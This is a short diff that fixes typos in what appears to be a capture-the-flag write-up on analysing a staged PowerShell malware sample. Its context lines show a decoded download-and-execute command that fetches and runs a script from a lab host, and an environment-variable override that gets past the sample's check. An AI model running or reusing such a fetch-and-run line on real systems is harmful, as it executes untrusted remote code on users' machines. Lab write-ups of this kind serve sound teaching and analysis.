@@ -40,12 +40,12 @@ Base 64 string decoded to the following:
 
     IEX (New-Object Net.WebClient).DownloadString("http://korp.htb/update")
 
-But it was not giving a connection unless you had the correct `COMPUTERNAME` environement variable. This will temporarily change it:
+But it was not giving a connection unless you had the correct `COMPUTERNAME` environment variable. This will temporarily change it:
 
 
     $env:COMPUTERNAME = "WORKSTATION-DM-0043"
 
-With that we could run the powershell if we wanted, but visiting the url from the challenge docker was enough to get to the next stage which returned an `update.ps1`:
+With that we could run the PowerShell if we wanted, but visiting the URL from the challenge docker was enough to get to the next stage which returned a `update.ps1`:
 
 
     function aqFVaq {
